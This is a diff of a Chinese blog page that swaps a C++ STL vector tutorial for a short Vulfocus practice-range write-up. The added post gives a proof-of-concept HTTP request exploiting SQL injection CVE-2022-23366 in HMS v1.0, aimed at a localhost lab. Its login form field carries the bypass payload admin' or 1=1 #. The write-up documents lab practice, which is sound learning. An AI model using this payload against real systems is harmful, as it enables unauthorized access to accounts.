@@ -19,24 +19,23 @@
   <meta name="author" content="Lixiney">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Vector（动态数组）头文件#include&lt;vector&gt;  初始化 定义一个vector  未初始化 输出 0  vector&lt;int&gt; a;   定义一个长度为3 的vector 未初始化 输出 0  vector&lt;int&gt; a(3);   定义一个长度为10 的vector 每个数赋值为 3  vector&lt;int&gt; a(10,3);">
+    <meta name="description" content="HMS v1.0 SQL注入(CVE-2022-23366)注入点在登录页面 poc： POST &#x2F;adminlogin.php HTTP&#x2F;1.1 Host: 127.0.0.1:43193 Content-Length: 54 Cache-Control: max-age&#x3D;0 sec-ch-ua: &quot;Not(A:Brand&quot;;v&#x3D;&quot;8&quot;, &quot;Ch">
 <meta property="og:type" content="article">
-<meta property="og:title" content="STL库（一）--Vector">
-<meta property="og:url" content="https://blog.lixey.top/STL%E5%BA%93%EF%BC%88%E4%B8%80%EF%BC%89-Vector/index.html">
+<meta property="og:title" content="Vulfocus 靶场记录（一）">
+<meta property="og:url" content="https://blog.lixey.top/Vulfocus-%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%EF%BC%88%E4%B8%80%EF%BC%89/index.html">
 <meta property="og:site_name" content="Lixiney&#39;s Blog">
-<meta property="og:description" content="Vector（动态数组）头文件#include&lt;vector&gt;  初始化 定义一个vector  未初始化 输出 0  vector&lt;int&gt; a;   定义一个长度为3 的vector 未初始化 输出 0  vector&lt;int&gt; a(3);   定义一个长度为10 的vector 每个数赋值为 3  vector&lt;int&gt; a(10,3);">
+<meta property="og:description" content="HMS v1.0 SQL注入(CVE-2022-23366)注入点在登录页面 poc： POST &#x2F;adminlogin.php HTTP&#x2F;1.1 Host: 127.0.0.1:43193 Content-Length: 54 Cache-Control: max-age&#x3D;0 sec-ch-ua: &quot;Not(A:Brand&quot;;v&#x3D;&quot;8&quot;, &quot;Ch">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-09-02T13:24:41.000Z">
-<meta property="article:modified_time" content="2025-07-08T13:23:22.395Z">
+<meta property="article:published_time" content="2026-03-24T05:56:22.000Z">
+<meta property="article:modified_time" content="2026-03-24T06:49:00.722Z">
 <meta property="article:author" content="Lixiney">
-<meta property="article:tag" content="C++">
-<meta property="article:tag" content="STL">
-<meta property="article:tag" content="算法">
+<meta property="article:tag" content="web安全">
+<meta property="article:tag" content="靶场">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>STL库（一）--Vector - Lixiney&#39;s Blog</title>
+  <title>Vulfocus 靶场记录（一） - Lixiney&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -179,7 +178,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="STL库（一）--Vector"></span>
+            <span id="subtitle" data-typed-text="Vulfocus 靶场记录（一）"></span>
           
         </div>
 
@@ -190,8 +189,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-09-02 21:24" pubdate>
-          September 2, 2024 pm
+        <time datetime="2026-03-24 13:56" pubdate>
+          March 24, 2026 pm
         </time>
       </span>
     
@@ -202,7 +201,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          672 words
+          192 words
         
       </span>
     
@@ -213,7 +212,7 @@
         
         
         
-          6 mins
+          2 mins
         
       </span>
     
@@ -250,127 +249,39 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">STL库（一）--Vector</h1>
+            <h1 id="seo-header">Vulfocus 靶场记录（一）</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="Vector（动态数组）"><a href="#Vector（动态数组）" class="headerlink" title="Vector（动态数组）"></a>Vector（动态数组）</h2><h4 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h4><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span></code></pre></div>
+                <h1 id="HMS-v1-0-SQL注入-CVE-2022-23366"><a href="#HMS-v1-0-SQL注入-CVE-2022-23366" class="headerlink" title="HMS v1.0 SQL注入(CVE-2022-23366)"></a>HMS v1.0 SQL注入(CVE-2022-23366)</h1><p>注入点在登录页面</p>
+<p>poc：</p>
+<div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/adminlogin.php</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:43193
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>54
+<span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0
+<span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not(A:Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;144&quot;
+<span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0
+<span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;
+<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9
+<span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1:43193
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded
+<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1
+<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+<span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin
+<span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate
+<span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1
+<span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document
+<span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1:43193/adminlogin.php
+<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br
+<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=n30rtma1gnnk63cb900vd524n7; _ga=GA1.1.1607377646.1774331048; _gid=GA1.1.857868182.1774331048; _gat=1; _ga_J1DQF09WZC=GS2.1.s1774331469$o1$g0$t1774331469$j60$l0$h0
+<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive
 
-<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><ol>
-<li>定义一个vector  未初始化 输出 0</li>
-</ol>
-<div class="code-wrapper"><pre><code class="hljs c++">vector&lt;<span class="hljs-type">int</span>&gt; a;</code></pre></div>
-
-<ol start="2">
-<li>定义一个长度为3 的vector 未初始化 输出 0</li>
-</ol>
-<div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">a</span><span class="hljs-params">(<span class="hljs-number">3</span>)</span></span>;</code></pre></div>
-
-<ol start="3">
-<li>定义一个长度为10 的vector 每个数赋值为 3</li>
-</ol>
-<div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">a</span><span class="hljs-params">(<span class="hljs-number">10</span>,<span class="hljs-number">3</span>)</span></span>;</code></pre></div>
-
-<ol start="4">
-<li>将向量b中从下标 0 1 2（共三个）的元素赋值给a ，a 的类型为int型</li>
-</ol>
-<div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">a</span><span class="hljs-params">(b.begin(),b.begin<span class="hljs-number">+3</span>)</span></span>;</code></pre></div>
-
-<ol start="5">
-<li>从数组中获得初始值</li>
-</ol>
-<div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-type">int</span> b[<span class="hljs-number">7</span>] = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>&#125;
-vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-built_in">a</span>(b,b<span class="hljs-number">+7</span>);</code></pre></div>
-
-<ol start="6">
-<li>输出</li>
-</ol>
-<div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> x:a)
-&#123;
-	cout &lt;&lt; x &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;
-&#125;</code></pre></div>
-
-<h3 id="size"><a href="#size" class="headerlink" title="size()"></a>size()</h3><div class="code-wrapper"><pre><code class="hljs c++">a.<span class="hljs-built_in">size</span>()    <span class="hljs-comment">// 返回元素个数</span></code></pre></div>
-
-<h3 id="resize"><a href="#resize" class="headerlink" title="resize()"></a>resize()</h3><div class="code-wrapper"><pre><code class="hljs c++">a.<span class="hljs-built_in">resize</span>()    <span class="hljs-comment">// 改变大小</span></code></pre></div>
-
-<h3 id="empty"><a href="#empty" class="headerlink" title="empty()"></a>empty()</h3><div class="code-wrapper"><pre><code class="hljs c++">a.<span class="hljs-built_in">empty</span>();    
-<span class="hljs-comment">// 判断a是否为空，空则返回true，非空则返回false</span></code></pre></div>
-
-<h3 id="front-和-back"><a href="#front-和-back" class="headerlink" title="front() 和 back()"></a>front() 和 back()</h3><div class="code-wrapper"><pre><code class="hljs c++">a.<span class="hljs-built_in">front</span>();
-<span class="hljs-comment">// 返回a的第一个元素，当且仅当a存在</span>
-a.<span class="hljs-built_in">back</span>();
-<span class="hljs-comment">// 返回vector的最后一个数</span></code></pre></div>
-
-<h3 id="倍增思想"><a href="#倍增思想" class="headerlink" title="倍增思想"></a>倍增思想</h3><p>C++ 系统为某一程序分配空间的所需时间，与空间大小无关，与申请次数有关如果申请一个空间为1000 和 空间 为1 申请1000 次的所需时间差别是很大的，申请次数越多，越耗时间。</p>
-<h3 id="clear"><a href="#clear" class="headerlink" title="clear()"></a>clear()</h3><div class="code-wrapper"><pre><code class="hljs c++">a.<span class="hljs-built_in">clear</span>();
-<span class="hljs-comment">//清空a中的元素</span></code></pre></div>
+<span class="language-routeros"><span class="hljs-attribute">loginid</span>=admin&#x27; <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1 #&amp;<span class="hljs-attribute">password</span>=12345678&amp;submit=Login</span></code></pre></div>
 
 
 
-<h3 id="支持比较运算"><a href="#支持比较运算" class="headerlink" title="支持比较运算"></a>支持比较运算</h3><p>比较操作 &#x3D;&#x3D; , !&#x3D; , &lt;  , &gt; , &lt;&#x3D; , &gt;&#x3D; </p>
-<div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
-<span class="hljs-function"></span>&#123;
-    <span class="hljs-comment">//支持比较运算</span>
-    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">a</span><span class="hljs-params">(<span class="hljs-number">4</span>,<span class="hljs-number">3</span>)</span>,<span class="hljs-title">b</span><span class="hljs-params">(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>)</span></span>;
-    <span class="hljs-comment">// a: 3 3 3 3  		b: 4 4 4 </span>
-    <span class="hljs-comment">//比较原理   字典序 （根据最前面哪个判断，如果一样就往后比较）</span>
-    <span class="hljs-keyword">if</span>(a &lt; b)
-        cout &lt;&lt; <span class="hljs-string">&quot;a &lt; b&quot;</span> &lt;&lt; endl;
-        
-&#125;</code></pre></div>
-
-<h3 id="push-back-和-pop-back"><a href="#push-back-和-pop-back" class="headerlink" title="push_back() 和 pop_back()"></a>push_back() 和 pop_back()</h3><div class="code-wrapper"><pre><code class="hljs c++">a.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">5</span>);
-<span class="hljs-comment">// 在a的最后一个向量后插入一个元素，其值为5</span>
-a.<span class="hljs-built_in">pop_back</span>();
-<span class="hljs-comment">//删除a向量的最后一个元素</span></code></pre></div>
-
-<h3 id="begin-和end"><a href="#begin-和end" class="headerlink" title="begin()和end()"></a>begin()和end()</h3><div class="code-wrapper"><pre><code class="hljs c++">a.<span class="hljs-built_in">begin</span>();  <span class="hljs-comment">// vector的第0个数；</span>
-a.<span class="hljs-built_in">end</span>(); <span class="hljs-comment">// vector的最后一个数的后面一个数</span>
-通常与<span class="hljs-keyword">for</span>循环结合使用</code></pre></div>
-
-<h3 id="遍历vector的三种方法"><a href="#遍历vector的三种方法" class="headerlink" title="遍历vector的三种方法"></a>遍历vector的三种方法</h3><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">nt <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
-<span class="hljs-function"></span>&#123;
-    vector&lt;<span class="hljs-type">int</span>&gt; a;
-    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)
-    &#123;
-        a.<span class="hljs-built_in">push_back</span>(i);
-    &#125;
-    <span class="hljs-comment">// 三种遍历vector的方法</span>
-    <span class="hljs-comment">//第一种</span>
-    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;a.<span class="hljs-built_in">size</span>();i++)
-    &#123;
-        cout &lt;&lt; a[i] &lt;&lt; <span class="hljs-string">&quot; &quot;</span> ;
-    &#125;
-    cout &lt;&lt; endl;
-    <span class="hljs-comment">// 第二种</span>
-    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> i=a.<span class="hljs-built_in">begin</span>();i!= a.<span class="hljs-built_in">end</span>();i++)
-    &#123;
-        cout &lt;&lt; *i &lt;&lt; <span class="hljs-string">&#x27; &#x27;</span>;
-    &#125;
-    cout &lt;&lt; endl;
-    <span class="hljs-comment">// 第三种    C++11 新语法</span>
-    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> x:a)
-    &#123;
-        cour &lt;&lt; x &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;
-    &#125;
-    cout &lt;&lt; endl;
-    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
-&#125;</code></pre></div>
-
-<h3 id="结合算法erase-reverse"><a href="#结合算法erase-reverse" class="headerlink" title="结合算法erase() reverse()"></a>结合算法erase() reverse()</h3><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span>
-<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
-<span class="hljs-function"></span>&#123;
-    a.<span class="hljs-built_in">erase</span>(b);  <span class="hljs-comment">//从a中删除迭代器p指定的元素，p必须只想c中的一个真实元素，不能是最后一个元素 end()</span>
-    a.<span class="hljs-built_in">erase</span>(b,e); <span class="hljs-comment">// 从a中删除迭代器对b和e所表示的范围中的元素，返回e</span>
-    
-    vector&lt;<span class="hljs-type">int</span>&gt; a=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;
-    <span class="hljs-built_in">reverse</span>(a.<span class="hljs-built_in">begin</span>(),a.<span class="hljs-built_in">end</span>()); <span class="hljs-comment">//a的值为 5,4,3,2,1 倒置</span>
-        
-&#125;</code></pre></div>
 
                 
               </div>
@@ -383,11 +294,9 @@ a.<span class="hljs-built_in">end</span>(); <span class="hljs-comment">// vector
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/STL/" class="print-no-link">#STL</a>
+        <a href="/tags/web%E5%AE%89%E5%85%A8/" class="print-no-link">#web安全</a>
       
-        <a href="/tags/C/" class="print-no-link">#C++</a>
-      
-        <a href="/tags/%E7%AE%97%E6%B3%95/" class="print-no-link">#算法</a>
+        <a href="/tags/%E9%9D%B6%E5%9C%BA/" class="print-no-link">#靶场</a>
       
     </div>
   
@@ -399,8 +308,8 @@ a.<span class="hljs-built_in">end</span>(); <span class="hljs-comment">// vector
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>STL库（一）--Vector</div>
-      <div>https://blog.lixey.top/STL库（一）-Vector/</div>
+      <div>Vulfocus 靶场记录（一）</div>
+      <div>https://blog.lixey.top/Vulfocus-靶场记录（一）/</div>
     </div>
     <div class="license-meta">
       
@@ -412,7 +321,7 @@ a.<span class="hljs-built_in">end</span>(); <span class="hljs-comment">// vector
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>September 2, 2024</div>
+          <div>March 24, 2026</div>
         </div>
       
       
@@ -444,18 +353,12 @@ a.<span class="hljs-built_in">end</span>(); <span class="hljs-comment">// vector
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/CTF-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="CTF-PHP代码审计">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">CTF-PHP代码审计</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/STL%E5%BA%93%EF%BC%88%E4%BA%8C%EF%BC%89-Pair-x-y/" title="STL库（二）--Pair[x,y]">
-                        <span class="hidden-mobile">STL库（二）--Pair[x,y]</span>
+                      <a href="/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91-VUE/" title="前端开发--VUE">
+                        <span class="hidden-mobile">前端开发--VUE</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
